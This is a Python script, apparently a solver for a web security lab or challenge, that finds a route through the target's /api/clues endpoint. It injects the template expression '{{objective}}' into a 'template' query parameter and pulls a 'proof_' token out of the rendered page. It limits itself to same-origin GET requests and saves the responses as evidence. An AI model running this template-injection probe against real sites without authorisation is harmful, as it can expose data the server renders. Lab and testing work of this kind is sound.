#!/usr/bin/env python3
"""Evaluate the assigned message template and extract its exposed objective."""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import re
import sys
from urllib.parse import parse_qs, urlencode, urljoin, urlsplit, urlunsplit

from inspect_target import fetch, normalize_url, origin, safe_filename


PROOF_RE = re.compile(r"\bproof_[A-Za-z0-9_-]{12,}\b")
TEMPLATE_PAYLOAD = "{{objective}}"


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Follow the assigned template route and recover the rendered proof."
    )
    parser.add_argument("target", help="absolute target URL from the current attempt")
    parser.add_argument("--output-dir", type=Path, help="directory for response evidence")
    args = parser.parse_args()

    try:
        target = normalize_url(args.target)
        allowed_origin = origin(target)
        host = urlsplit(target).hostname or "target"
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        output_dir = args.output_dir or (
            Path("web-tools/evidence") / f"{host}-template-expression-{timestamp}"
        )
        output_dir.mkdir(parents=True, exist_ok=True)

        clues_url = normalize_url(urljoin(target, "/api/clues"))
        clues_result = fetch(clues_url, allowed_origin, timeout=10)
        clues_body = clues_result.pop("_body", None)
        if clues_result.get("status") != 200 or not isinstance(clues_body, bytes):
            raise RuntimeError(f"route inventory returned HTTP {clues_result.get('status')}")
        clues = json.loads(clues_body.decode("utf-8"))
        if not isinstance(clues, dict):
            raise ValueError("route inventory is not a JSON object")
        route = clues.get("feature_route")
        if not isinstance(route, str) or not route:
            raise ValueError("route inventory lacks feature_route")

        feature_url = normalize_url(urljoin(target, route))
        if origin(feature_url) != allowed_origin:
            raise ValueError("route inventory points outside the assigned target")
        parts = urlsplit(feature_url)
        query = parse_qs(parts.query, keep_blank_values=True)
        query["template"] = [TEMPLATE_PAYLOAD]
        feature_url = urlunsplit(
            (parts.scheme, parts.netloc, parts.path, urlencode(query, doseq=True), "")
        )
        feature_result = fetch(feature_url, allowed_origin, timeout=10)
        feature_body = feature_result.pop("_body", None)
        if feature_result.get("status") != 200 or not isinstance(feature_body, bytes):
            raise RuntimeError(f"template route returned HTTP {feature_result.get('status')}")
        proof_matches = PROOF_RE.findall(feature_body.decode("utf-8", errors="replace"))

        clues_path = output_dir / safe_filename(1, clues_url)
        clues_path.write_bytes(clues_body)
        feature_path = output_dir / safe_filename(2, feature_url)
        feature_path.write_bytes(feature_body)
        report = {
            "target": target,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "clues": clues,
            "template_payload": TEMPLATE_PAYLOAD,
            "feature_url": feature_url,
            "proof": proof_matches[-1] if proof_matches else None,
            "request_policy": {"method": "GET", "same_origin_only": True},
            "responses": {
                "clues": {
                    "status": clues_result.get("status"),
                    "file": clues_path.name,
                    "sha256": hashlib.sha256(clues_body).hexdigest(),
                },
                "feature": {
                    "status": feature_result.get("status"),
                    "file": feature_path.name,
                    "sha256": hashlib.sha256(feature_body).hexdigest(),
                },
            },
        }
        report_path = output_dir / "report.json"
        report_path.write_text(
            json.dumps(report, indent=2, ensure_ascii=False) + "\n",
            encoding="utf-8",
        )
        if not proof_matches:
            raise RuntimeError(
                f"rendered template contains no proof; inspect {report_path}"
            )
        print(
            json.dumps(
                {
                    "proof": proof_matches[-1],
                    "report": str(report_path),
                    "feature_url": feature_url,
                },
                indent=2,
            )
        )
        return 0
    except (
        ValueError,
        RuntimeError,
        OSError,
        UnicodeDecodeError,
        json.JSONDecodeError,
    ) as exc:
        print(json.dumps({"error": str(exc)}), file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
